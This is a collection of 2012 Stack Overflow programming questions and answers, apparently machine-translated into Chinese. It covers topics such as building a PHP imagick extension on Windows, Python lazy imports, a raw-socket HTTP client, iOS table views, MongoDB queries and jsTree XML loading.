> 标签：jquery, jsp, jquery-plugins, image-editor

我是图像编辑的初学者。我正在开发一个 JSP 网站。我的客户需要在网站上进行图像编辑，例如调整图像大小、裁剪图像、为图像添加框架。有没有可用于此目的的插件？我可以为此获得任何 jquery 插件吗？我已经扔掉了一些已经发布的问题。但是它们对我的目的没有多大帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-16T06:28:14.747

据我所知，没有插件可以一起完成所有功能，但您可以组合这些功能。看看下面的插件。

[jQuery resize-crop](http://code.google.com/p/resize-crop/)插件可用于图像裁剪和调整大小。还有一个插件[jquery-imageframe](http://code.google.com/p/jquery-imageframe/wiki/Readme)可以为图像添加自定义帧。

这是[一篇](http://woork.blogspot.in/2009/02/best-image-croppers-ready-to-use-for.html)关于最佳图像裁剪器的文章。（可能有用）

# iis-6 - IIS cgi: "%s" %s 是什么意思

> ID：10084478
> 
> 赞同：1
> 
> 时间：2012-04-10T07:04:55.430
> 
> 标签：iis-6, cgi, v8cgi

我在 IIS6 服务器上摆弄了一下 v8cgi。有谁知道`"%s" %s`（cgi）服务映射和应用程序路径中的参数实际上是什么意思/做什么？我真的在互联网上找不到任何东西。另外，如果有人知道，有没有办法让 v8cgi 使用 iis fastcgi 扩展运行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T08:00:55.213

[在这里](http://www.xav.com/perl/faq/Windows/ActivePerl-Winfaq6.html)找到

> 要将 Perl 作为 CGI 应用程序运行，请键入 Perl.EXE 的完整路径，后跟 %s %s。执行脚本时，第一个 %s 将替换为脚本的完整路径，第二个 %s 将替换为脚本参数。

它们没有在第一个周围包含引号，`%s`但如果文件名中有空格，它们应该存在。

# ios - 应用程序处于活动状态时，iOS 推送通知无法显示在通知栏中？

> ID：10084486
> 
> 赞同：0
> 
> 时间：2012-04-10T07:05:23.570
> 
> 标签：ios, notifications

当我退出我的应用程序时，如果我收到消息，通知栏会告诉我原因，但是当我启动应用程序时，它只是不显示在通知栏上，我做错了什么或遗漏了吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T09:42:57.863

您应该从 UIApplication 的回调中显示自定义 UIAlertView：

```
- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo 
```

更新：阅读：[处理本地和远程通知](http://developer.apple.com/library/ios/DOCUMENTATION/NetworkingInternet/Conceptual/RemoteNotificationsPG/IPhoneOSClientImp/IPhoneOSClientImp.html#//apple_ref/doc/uid/TP40008194-CH103-SW4)：

> 让我们回顾一下操作为应用程序传递本地通知或远程通知时的可能场景。

*   当应用程序未在前台运行时会发送通知。

> 在这种情况下，系统会显示通知、显示警报、标记图标，可能还会播放声音。

...

*   当应用程序在前台运行时发送通知。

> 应用程序调用其委托的 application:didReceiveRemoteNotification: 方法（用于远程通知）或 application:didReceiveLocalNotification: 方法（用于本地通知）并传入通知负载或本地通知对象。

# python - 为什么延迟导入在 Python 中不是默认设置？

> ID：10084487
> 
> 赞同：11
> 
> 时间：2012-04-10T07:05:25.957
> 
> 标签：python

我试图了解一些关于设计的事情。

我看到许多使用延迟导入功能的代码。通过延迟导入，我的意思是由支持“延迟导入”样式的某些配方、包和模块提供的设施。这些实现通常旨在仅在使用模块时导入模块，并为不同的事物提供一些额外的钩子。我知道错误情况在这里被延迟了，但我试图理解为什么延迟导入不是 Python 中的默认策略。

它的（其他）缺点可能会阻止它成为一般有用的案例。或者是否有语言将其​​用作默认导入机制策略。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T07:38:09.057

这是python中延迟导入的示例：

```
def xmlfrobnicator(xmlstr):
    from lxml import etree

    # do whatever 
```

它不常用，因为它为大多数程序提供的优势很少 - 一旦加载，模块就会被加载（除非您采取步骤卸载它），并且很少有依赖项很少使用以至于只在加载时加载它使用是值得的。

我想你可能一直在看 javascript，其中程序可能只运行很短的时间，并且不会使用它们的所有功能，即使它们这样做了，模块的后台加载也会提高用户感知的速度。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-10T07:40:44.670

Python 与 PHP 不同，很少以每个请求/动作/... 导致整个应用程序重新启动的方式使用。
因此，在启动时导入所有内容的优点是不必在应用程序执行延迟令人讨厌的事情时执行导入。
本地/惰性导入的唯一优点是循环导入不会有问题。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-05-13T17:06:47.103

有时模块在第一次加载时会做重要的事情，因此它可能会破坏程序以延迟模块的导入。例如，如果一个模块定义了应在程序首次启动时解析的命令行标志，则必须在解析参数之前导入该模块。由于 Python 最初设计为急切地进行导入，因此现在不可能在不破坏某些现有程序的情况下更改默认行为。此外，正如其他一些答案中所提到的，对于长时间运行的服务，通常希望在服务请求之前预先加载所有内容，这样前几个请求就不会因为等待模块被导入而减慢。

# wpf - 在 wpf 中打包 uri

> ID：10084488
> 
> 赞同：0
> 
> 时间：2012-04-10T07:05:34.613
> 
> 标签：wpf, url, wpf-controls

我在应用程序中发现了 Image Source URI 的两个不同示例。

它们之间有什么区别？

```
Source="/MyAssembly;component/Resources/Images/image1.png"

Source="pack://application:,,,/MyAssembly;component/Resources/Images/image1.png" 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:07:12.913

第一个是 Pack URI 的缩写形式，第二个是完整的。详细信息 - [http://msdn.microsoft.com/en-us/library/aa970069.aspx](http://msdn.microsoft.com/en-us/library/aa970069.aspx)

# php - 将 PHP 扩展编译为非线程安全的

> ID：10084493
> 
> 赞同：6
> 
> 时间：2012-04-10T07:06:17.733
> 
> 标签：php, windows, compilation

我正在尝试编译 imagemagick (imagick) 扩展以在 Windows 上的非线程安全环境中使用。

我正在使用 PHP 5.3.10 并设置了 Visual C++ express 作为我的编译环境。问题是我在 Apache 2.2 中使用 PHP 的非线程安全版本作为 FCGI 模块。

因此，我的 PHP 提供了 a`php5.lib`而不是`php5ts.lib`. 我相信这就是我收到这些错误的原因：

```
imagick.obj : error LNK2019: unresolved external symbol __imp__tsrm_mutex_alloc referenced in function _zm_startup_imagick 
```

我只在 linux 上构建和编译过东西，所以不太确定如何在 windows 环境中执行此操作。

如何编译扩展使其成为非线程安全的？

* * *

我下载了 PHP 5.3.10 的线程安全二进制文件以获取 php5ts.lib 的副本。然后我能够编译扩展。

我猜测将`ZTS`预处理器指令设置为`1`或`0`将导致扩展编译为线程安全或非线程安全。（对此不太确定，所以如果有人可以让我知道这是否正确，将不胜感激。:)）

然后我设置了一个运行 Windows 7 的虚拟机并安装了最新版本的 WAMP。原因是它使用了 PHP 的线程安全版本。

我将 dll 放在 PHP 安装的 ext 文件夹中，并在`php.ini`. 但是，即使在 WAMP 中尝试了 ts 和 nts 版本后，我也会得到：

```
PHP Warning:  PHP Startup: Unable to load dynamic library 'c:/wamp/bin/php/php5.3.10/ext/imagick.dll' - The specified module could not be found.
 in Unknown on line 0 
```

但问题是`c:/wamp/bin/php/php5.3.10/ext/imagick.dll'`确实存在，是的，我已经检查过很多次了。

然后我将 ImageMagick 降级到 6.6.2-10-Q16，但仍然看到同样的问题。

同样的问题发生在我的开发机器上，在 Apache 2.2 上运行 nts 版本的 PHP 5.3.10（全部手动安装）。

* * *

看起来我对`ZTS`预处理器可能是错误的。如果我设置`ZTS=0`并编译，在编译的 dll 上使用依赖 walker 仍然显示它需要`php5ts.dll`仅存在于 PHP 的线程安全版本中。

* * *

我对dependency walker做了更多的修改，发现我必须在统计上链接到msvc100d.dll。然后我在预处理器定义中删除`ZTS`，并且能够使用`php5.lib`而不是`php5ts.dll`. 我认为这应该给我一个非 ts dll。

但是，在加载扩展时，我仍然得到：

```
PHP Warning:  PHP Startup: Invalid library (maybe not a PHP library) 'imagick.dll' in Unknown on line 0 
```

以及依赖walker的错误：

```
Error: At least one module has an unresolved import due to a missing export function in an implicitly dependent module.
Error: Modules with different CPU types were found.
Warning: At least one delay-load dependency module was not found.
Warning: At least one module has an unresolved import due to a missing export function in a delay-load dependent module. 
```

* * *

安装了visual c++ express 2008并使用平台工具包v90编译，但仍然面临同样的问题。

任何提示表示赞赏:)

* * *

# **找到解决方案！看我的回答。**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T01:45:41.623

知道了！我希望这可以帮助那些将来在windows上编译php扩展的人。我所做的基于：[https ://wiki.php.net/internals/windows/stepbystepbuild](https://wiki.php.net/internals/windows/stepbystepbuild)

注意：我在此站点上阅读了一个答案，说不支持在 Windows 上自行编译 PHP 扩展。根据我昨天的实验，这似乎也是很多工作，所以我正在使用 PHP 构建过程。

最好的方法是使用 PHP 构建过程。

1.  安装 Visual C++ Express 2008（任何版本都可以，但 express 是免费的）和 Windows SDK 6.1（请注意，我们需要 6.1 版本，而不是任何旧版本或新版本）。

2.  如果尚未安装[SVN 客户端工具](https://sliksvn.com/download/)`PATH`，请重新启动以使变量生效。

3.  获取[PHP SDK 二进制工具](https://windows.php.net/downloads/php-sdk/)并将其解压缩到`C:\php-sdk`.

4.  在开始菜单`CMD Shell`下`Microsoft Windows SDK v6.1`启动并运行`cd C:\php-sdk`.

5.  运行`setenv /x86 /xp /release`此命令会创建一个 32 位版本。您可以使用`/x64`构建 64 位版本（我没有尝试过这个）。

6.  跑`bin\phpsdk_setvars.bat`

7.  跑`bin\phpsdk_buildtree.bat php53dev`

8.  下载[PHP 源代码](https://www.php.net/downloads.php)并将其解压缩，`C:\php-sdk\php53dev\vc9\x86` 以便您最终获得`C:\php-sdk\php53dev\vc9\x86\php5.3-xyz`

9.  下载最新的[deps](https://windows.php.net/downloads/php-sdk/)并将所有内容解压缩到`C:\php-sdk\php53dev\vc9\x86`. 系统可能会提示您覆盖任何现有文件夹，因此请按是。

10.  跑`cd C:\php-sdk\php53dev\vc9\x86`

11.  从 svn 存储库中查看最新版本的扩展：`svn co http://svn.php.net/repository/pecl/imagick/trunk pecl/imagick`我在这里查看 imagick。

12.  安装任何依赖项。就我而言，我需要安装 ImageMagick，所以我下载了最新推荐的[windows 二进制文件](https://www.imagemagick.org/script/download.php#windows)。您需要在安装后重新启动以更新您的`PATH`变量，但您可以在编译后执行此操作。确保您安装了 C/C++ 头文件和包含文件。

13.  将`includes`目录的内容从 ImageMagick 安装目录复制到`C:\php-sdk\php53dev\vc9\x86\deps\include`.

14.  将`lib`目录的内容从 ImageMagick 安装目录复制到`C:\php-sdk\php53dev\vc9\x86\deps\lib`

15.  现在，让我们构建：运行`cd C:\php-sdk\php53dev\vc9\x86\php5.3-xyz`then `buildconf`then `configure --help`。正确查看帮助。它将向您显示所有配置标志和任何可用的扩展以启用。就我而言，因为我添加了 imagick，所以我有一个名为`--with-imagick`

16.  运行配置：`configure --enable-cli --with-imagick=shared --disable-zts`如果你想构建一个非线程安全的二进制使用`--disable-zts`，否则删除该配置标志。我不知道为什么，但有时扩展使用`--with-myextension`标志，有时`--enable-myextension`，所以检查`configure --help`要使用的标志。如果`=shared`在扩展标志之后添加，它将被编译为单独的 DLL，这正是我们想要的。

17.  编译：`nmake`然后运行`nmake snap`。

18.  完成 :) 检查`C:\php-sdk\php53dev\vc9\x86\php-5.3.10\Release`（非线程安全）或`C:\php-sdk\php53dev\vc9\x86\php-5.3.10\Release_TS`（线程安全）。您编译的二进制文件应该在那里。编译后的扩展 (pecl) 应该在一个类似于 .zip 的 ZIP 文件中`pecl-5.3.10-nts-Win32-VC9-x86.zip`。打开此文件并将扩展 DLL 解压缩到您`ext`的 PHP 安装文件夹中。

19.  启用 PHP 扩展并重新启动您的网络服务器。运行`phpinfo()`并检查扩展是否已启用。

20.  如果扩展无法正常工作，请确保您重新启动以更新您的`PATH`变量。就我而言，我需要在我的`PATH`变量中有 imagemagick 安装目录。

21.  ？？？

22.  利润！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T16:22:43.187

有需要编译的理由吗？为什么不下载？它通常在 Windows 上更简单/更快。

VC6：[http ://www.sk89q.com/2010/03/vc6-windows-binaries-for-imagick-2-3-0/](http://www.sk89q.com/2010/03/vc6-windows-binaries-for-imagick-2-3-0/)

VC9：http: [//valokuva.org/builds/](http://valokuva.org/builds/)

# jdbc - 无法理解 clojure 中的 SQLException 异常

> ID：10084501
> 
> 赞同：2
> 
> 时间：2012-04-10T07:06:32.040
> 
> 标签：jdbc, clojure

我创建了一些 clojure 函数来访问数据库，如下面的代码片段所示：

```
(defn get-dg [date]
  (let [query (str "......")
        ]
    (jdbc/with-connection db
      (jdbc/with-query-results rows 
          [query date date date date]
          (.debug log rows)
          (if (not (seq rows)) 
           nil
           rows))))
) 
```

一切正常。该查询返回一个结果集，然后我可以对其进行处理。现在，如果我注释掉（.debug 日志行），我会得到：

```
java.lang.RuntimeException: java.sql.SQLException: Closed Resultset: next 
```

知道为什么吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:37:47.793

我不是 100% 确定，但我想问题是，结果 seq 是惰性的，当你处理它时，数据库连接已关闭（你在 .seq 之外`with-connect`）。

您的调试语句会在连接仍处于打开状态时强制实现。

一些小的风格评论：

您不必使用 str 将字符串转换为字符串。

if not seq 的事情，可以简化为：

```
(if (seq rows)
    rows) 
```

（或者甚至只是`rows`，如果它只能是一个 seq 或`nil`无论如何）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:57:49.283

“行”是懒惰的。而且似乎“（.debug log rows）”评估了“rows”。只需明确地这样做：

```
(defn get-dg [date]
  (let [query (str "......") ]
    (jdbc/with-connection db
      (jdbc/with-query-results rows [query date date date date]
        (comment .debug log rows)
        (if (empty? rows) nil (doall rows)))))) 
```

# iphone - tableview 在单击单元格或在 ios 5 中滚动时崩溃

> ID：10084502
> 
> 赞同：0
> 
> 时间：2012-04-10T07:06:35.647
> 
> 标签：iphone, objective-c, uitableview, ios5

我制作了一个演示空应用程序并添加了一个带有视图的导航控制器

```
UINavigationController *navBar = [[UINavigationController alloc]initWithRootViewController:objFirstViewControllerViewController];
[self.window addSubview:navBar.view]; 
```

之后，我在第一个视图控制器上添加一个表格视图，如下所示。

```
UITableView* demotableView = [[UITableView alloc]initWithFrame:CGRectMake(0, 0, 320, 400) style:UITableViewStylePlain];
demotableView.delegate = self;
demotableView.dataSource = self;
[self.view addSubview:demotableView]; 
```

以及像这样的行功能的表格视图和主单元格的委托功能

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
 NSString *CellIdentifier = @"Cell";

UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
  cell.textLabel.text = @"Hello this is sample text";
cell.textLabel.minimumFontSize = 12;
cell.textLabel.adjustsFontSizeToFitWidth = TRUE;
cell.textLabel.font = [UIFont fontWithName:@"Copperplate" size:18];
return cell;
} 
```

但是，当我在我的表格上滚动或单击任何单元格以进入下一个视图时，它只会崩溃并分别在单击和滚动时出现这两个错误。

```
[__NSCFArray tableView:didSelectRowAtIndexPath:]
[__NSCFDictionary tableView:cellForRowAtIndexPath:] 
```

我不明白它一直在正确使用先前的操作系统的这段代码出了什么问题

任何机构都可以帮忙吗？

这是选择行的代码

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
Second *anotherViewController = [[Second alloc] initWithNibName:nil bundle:nil];
[self.navigationController pushViewController:anotherViewController animated:YES];

} 
```

没有一行是这个

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {

return 15;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T11:02:52.497

实际上我滥用了 ARC 我为使应用程序成功运行所做的更改实际上由于内存泄漏而崩溃表的委托和数据源尝试在它发布的当前类中添加东西，并从这些消息实例中抛出消息，我被卡住了，因为我认为它正在发生，因为我采用了一个空的应用程序，但在添加了这些行之后在委托类下面我解决了问题。

我在`.h`文件的委托类中做了什么：

```
 FirstViewControllerViewController *objFirstViewControllerViewController;

@property (strong, nonatomic)  FirstViewControllerViewController *objFirstViewControllerViewController; 
```

然后我的桌子开始表现正常，我遇到的所有问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:16:47.960

用这个替换你的代码并尝试：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath 
{
  static NSString *CellIdentifier = @"Cell";

  UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
  if(cell == nil)
  {
    cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];

  }
  cell.textLabel.text = @"Hello this is sample text";

  cell.textLabel.minimumFontSize = 12;

  cell.textLabel.adjustsFontSizeToFitWidth = TRUE;

  cell.textLabel.font = [UIFont fontWithName:@"Copperplate" size:18];

  return cell;
} 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:22:29.797

由于您已设置`demotableView.delegate = self;` ，因此您必须实现`tabelView: didSelectRowAtIndexPath:`解决选择（单击）单元格时崩溃的功能。

要解决滚动崩溃，您必须实现

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section; 
```

方法。

PS：在`cellForRowAtIndexPath`:中，除了`cell.textLabel.text`应该在里面的所有行

```
if(cell == nil){
} 
```

请遵守适当的内存管理规则

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T07:38:04.987

请试试这个......

像这样添加您的表格视图..

```
 productList = [[UITableView alloc] initWithFrame:CGRectMake(0,102, 320, 267) style:UITableViewStylePlain];
 productList.delegate = self;
 productList.dataSource = self;
 productList.backgroundColor = [UIColor clearColor];
 [self.view addSubview:productList]; 
```

并添加这些方法....

```
 #pragma mark Table view data source

  // Customize the number of sections in the table view.
    - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
      return 1;
   }

 // Customize the number of rows in the table view.
   - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
     return (your row count);
    }

 // Customize the appearance of table view cells.
  - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
         cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier]autorelease];
     }

 // Configure the cell.

         cell.textLabel.text = @"Title";
         cell.detailTextLabel.text = formattedString;
         cell.detailTextLabel.textColor = [UIColor darkGrayColor];

         return cell;

      }

  - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
      Second *anotherViewController = [[Second alloc] initWithNibName:nil bundle:nil];
     [self.navigationController pushViewController:anotherViewController animated:YES];

   } 
```

# c++ - 静态成员和多线程

> ID：10084509
> 
> 赞同：2
> 
> 时间：2012-04-10T07:07:13.343
> 
> 标签：c++, multithreading, static

我正在并行调用 newSeed() 和 rand()，Random 类的静态成员函数。newSeed() 提供类 Random 的静态成员（我们称之为种子）。更具体地说，我在另一个类 Method 类中并行调用此函数：

```
 double* Method::randomPoint(double* bottom_, double* top_ )
 {
try{
    Random generator_ ;

    double* pt_ = new double[m_ndim];

    generator_.newSeed();
    for(int i=0;i<m_ndim;i++)
    {
        pt_[i]= generator_.rand(bottom_[i],top_[i]);
    }

    return pt_;

}
catch(...)
{
     return NULL;
}
 } 
```

总而言之，在每个并行化调用中，我创建了一个类 Random 的新实例，我在这个对象中调用了 newSeed() 和 rand() 方法。由于 newSeed() 在给定实例上被调用，我希望 newSeed() 为这个对象初始化种子成员 - 因此只为这个线程。由于种子是静态的并且 newSeed() 也是静态的，我是否正在为所有当前正在运行的 Random 类实例（以及所有线程）修改种子？

请告诉我是否必须澄清问题。

谢谢并恭祝安康。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T07:15:37.417

静态字段在流程类的所有实例之间共享。此外，线程在同一个进程中运行，这意味着它们共享内存，使用相同的类

因此，如果您修改静态字段种子，则所有线程中的所有“随机”实例都将进行修改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:55:30.400

如果 newSeed() 是静态的并且修改了一些数据 - 从单独的线程调用它是不安全的。您需要其中之一：

a) 让它不是静态的

b) 不要称它为线程函数

c) 放一些互斥体来防止线程冲突。

# python - 套接字没有接收到数据。为什么？

> ID：10084510
> 
> 赞同：0
> 
> 时间：2012-04-10T07:07:16.547
> 
> 标签：python, http, sockets

我正在学习套接字编程并尝试设计我的基本 http 客户端。但不知何故，一切都很顺利，但我没有收到任何数据。你能告诉我我错过了什么吗？

**代码**

```
import socket

def create_socket():
    return socket.socket( socket.AF_INET, socket.SOCK_STREAM )

def remove_socket(sock):
    sock.close()
    del sock

sock = create_socket()
print "Connecting"
sock.connect( ('en.wikipedia.org', 80) )
print "Sending Request"
print sock.sendall  ('''GET /wiki/List_of_HTTP_header_fields HTTP/1.1
Host: en.wikipedia.org
Connection: close
User-Agent: Web-sniffer/1.0.37 (+http://web-sniffer.net/)
Accept-Encoding: gzip
Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7
Cache-Control: no-cache
Accept-Language: de,en;q=0.7,en-us;q=0.3
Referer: d_r_G_o_s
''')
print "Receving Reponse"
while True:
    content = sock.recv(1024)
    if content:
        print content
    else:
        break
print "Completed" 
```

**输出**

```
Connecting
Sending Request
298
Receving Reponse
Completed 
```

虽然我期待它向我展示维基百科主页的 html 内容:'(

此外，如果有人可以分享一些网络资源/书籍，我可以在其中详细阅读有关 HTTP 请求客户端的 python 套接字编程的详细信息，那就太好了

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:14:21.897

对于最小的 HTTP 客户端，您绝对不应该发送`Accept-Encoding: gzip`- 服务器很可能会回复一个您无法用肉眼理解的压缩响应。:)

您没有发送最后的双精度`\r\n`（也不是您实际上`\r\n`按照规范终止了您的行（除非您碰巧在 Windows 上使用 Windows 行结尾进行开发，但这只是运气而不是编程本身）。

此外，`del sock`没有做你认为它做的事情。

无论如何 - 这有效：

```
import socket
sock = socket.socket()
sock.connect(('en.wikipedia.org', 80))
for line in (
    "GET /wiki/List_of_HTTP_header_fields HTTP/1.1",
    "Host: en.wikipedia.org",
    "Connection: close",
):
    sock.send(line + "\r\n")
sock.send("\r\n")

while True:
    content = sock.recv(1024)
    if content:
        print content
    else:
        break 
```

编辑：至于资源/书籍/参考——对于参考 HTTP 客户端实现，请查看 Python 自己的`httplib.py`. :)

# c - 三元运算“？：”的返回值是多少？

> ID：10084512
> 
> 赞同：2
> 
> 时间：2012-04-10T07:07:32.040
> 
> 标签：c

同学问我一个问题：

在此之后 x,y,z 的值是多少：

```
x=5;
y=8;
z=((x++)<(y++)?(x++):(y++)); 
```

我不确定，所以我测试了一下，答案是：

```
x=7,y=9,z=6 
```

我可以理解为什么“x=7”和“y=9”，但是为什么“z=6”？这个表达式不应该返回由 "x++" 计算的值吗？

感谢帮助 ：）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T07:12:00.520

在运算符的第一个操作数和第二个或第三个运算符的评估之间存在一个[序列点](http://en.wikipedia.org/wiki/Sequence_point)，因此第一个将完全生效，导致 x=6。但是第二个中的增量只有在评估完整表达式后才会生效，因为该表达式中没有更多的序列点，因此 x 保持 6 且 z=6。`?``x++``x++`

# python - 如何在 MongoDB 中查询这个？

> ID：10084513
> 
> 赞同：0
> 
> 时间：2012-04-10T07:07:33.620
> 
> 标签：python, mongodb

我的项目像这样存储在 MongoDB 中：

```
{"ProductName":"XXXX",
   "Catalogs" : [
    {
        "50008064" : "Apple"
    },
    {
        "50010566" : "Box"
    },
    {
        "50016422" : "Water"
    }
]} 
```

现在我想查询属于Catalog:50008064的所有项目，怎么办？（目录 ID“50008064”，目录名称“Apple”）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T09:55:20.853

您无法以有效的方式查询它，并且性能会随着数据的增长而下降。因此，我认为这是一个架构错误，您应该重构/迁移到以下允许索引的模型：

```
{"ProductName":"XXXX",
   "Catalogs" : [
    {
        id : "50008064",
        value : "Apple"
    },
    {
        id : "50010566",
        value : "Box"
    },
    {
        id : "50016422",
        value : "Water"
    }
]} 
```

然后索引：

```
ensureIndex({'Catalogs.id':1}) 
```

同样，我强烈建议您更改架构，因为这是一个潜在的性能瓶颈，您无法以任何其他方式解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:20:13.167

这应该可以根据[这里的条目](http://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-%24exists)工作，尽管这不会很快，如链接中所述。

```
db.products.find({ "Catalogs.50008064" : { $exists: true } } ) 
```

# c# - 将复选框列表中的项目链接到其他页面

> ID：10084516
> 
> 赞同：0
> 
> 时间：2012-04-10T07:07:42.287
> 
> 标签：c#, asp.net

我有一个复选框列表。当我选中一个复选框时，该值将出现在表格中。现在我想要该值以及我检查的每个值以使其成为链接。这是我获取选中值的代码：

```
foreach (ListItem item in check.Items)
            {
                if (item.Selected)
                {

                    TableRow row = new TableRow();
                    TableCell celula = new TableCell();
                    celula.Style.Add("width", "200px");
                    celula.Style.Add("background-color", "red");

                    //celula.RowSpan = 2;
                    celula.Text = item.Value.ToString();

                    row.Cells.Add(celula);

                    this.tabel.Rows.Add(row); 
```

现在我希望 item.value 使其成为链接..我在 asp.net 应用程序中使用 c#

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:25:29.007

将`Hyperlink`控件添加到`celula.Controls`集合中，而不是设置 TableCell 的`Text`属性。

```
// Create a Hyperlink Web server control and add it to the cell.
System.Web.UI.WebControls.HyperLink h = new HyperLink();
h.Text = item.Value;
string url = "~/Default.aspx?Item=" + Server.UrlEncode(item.Value);
h.NavigateUrl = url;
celula.Controls.Add(h); 
```

请注意，您需要在每次回发时重新创建此表，因此您可能希望将其添加到其中`Page_PreRender`。

# python - 如何在 Python 中删除列表的范围（小节）？

> ID：10084517
> 
> 赞同：24
> 
> 时间：2012-04-10T07:08:00.700
> 
> 标签：python, list

我有一个简单的、总是连续排序的列表，如下所示：

```
all = [ 1, 2, 3, 4, 5, 6 ] # same as range( 1, 7 ) 
```

我也有`current = 4`。最后我希望`all`列表看起来像这样

```
altered = [ 1, 2, 5, 6 ] 
```

所以发生的事情是它删除了`current`数字和*它之前* `3`的数字。

`current`也可以是`1`and `0`，所以我想确保它不会对这两个值抛出错误。

除了例外`current = 0`，更改后的列表是这样的

```
altered = [ 1, 2, 3, 4, 5 ] 
```

这意味着`current = 0`只需删除最后一个数字。

我觉得你可能可以用生成器编写一些花哨的东西，但我不擅长编写它们。

提前致谢！

**在一行中执行此操作的**奖励积分。**如果`current = 0`太麻烦，那么它也可能是`current = -1`or `current = 7`。**

 ****编辑：**确保检查`current = 1`，这应该是

```
altered = [ 2, 3, 4, 5, 6 ] 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-10T07:12:09.970

```
all = all[:max(current - 2, 0)] + all[current:] 
```

或者

```
del all[max(current - 2, 0):current] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T07:12:49.357

这行得通吗？

```
>>> all = range(1, 7)
>>> new = all[:2]+all[4:]
>>> print new
[1, 2, 5, 6] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T15:23:12.650

```
all[:max(current-2,0)] + all[max(current,0):][:-1] + all[-1:]*(0 < current < len(all)) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T07:20:42.297

```
>>> all = range(1,7)
>>> current = 4
>>> [item for item in all if item != current and item != current-1]
[1, 2, 5, 6]
>>> current = 0
>>> [item for item in all if item != current and item != current-1]
[1, 2, 3, 4, 5, 6] 
```**

# internet-explorer-9 - jsTree 使用的 xml_data 插件在 IE9 中不起作用？

> ID：10084520
> 
> 赞同：0
> 
> 时间：2012-04-10T07:08:05.007
> 
> 标签：internet-explorer-9, jstree

我正在尝试使用 JsTree 插件来显示层次结构树。现在树只能在 Firefox 浏览器上正确呈现，在 IE 8 或 9 或我们测试的任何其他浏览器中都不起作用。我在内部使用 XML 格式的数据，最近发现 IE9 无法识别 xml_data 插件。

另一种选择是使用 JSON 来呈现数据，所以想知道它是否应该与 JSON 一起正常工作，如果是的话，有没有办法可以以某种方式将 XML 数据直接转换为 JSON 格式？

提前致谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-07T11:10:28.703

在 ajax 调用中使用 dataType = text 而不是 xml 您的问题将解决:)

我的**Employees_xml_flat.xml**文件包含如下：如果需要，可以添加更多节点

```
<item id="19001" parent_id="0"   >  
            <content><name>Vaibhav</name></content>                
        </item>  
        <item id="19002" parent_id="19003"   >    
      <content><name>Pri_dev</name></content> 
      </item> 
```

请参阅以下示例代码：此 jsTree 可以在 IE、Mozila 和 Google chrome 上正常工作。未在其他浏览器上测试

使用 jsTree

```
 $(document).ready(function(){
        $.ajax({
            type: "GET",
            url: "Employees_xml_flat.xml",
            dataType: "text",
            success: function(xmlData) {
                $("#treeViewDiv").jstree({
                    "xml_data" : {
                        "data" : xmlData
                    },
                    "plugins" : [ "themes", "xml_data" ]
                });
            }
        });
    });

</script>
</head>
<body>
    <div id="treeViewDiv"></div>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:13:20.787

我们使用了 jquery.xml2json，只要传入的 XML 有效，它就可以很好地工作。

[http://www.fyneworks.com/jquery/xml-to-json/](http://www.fyneworks.com/jquery/xml-to-json/)

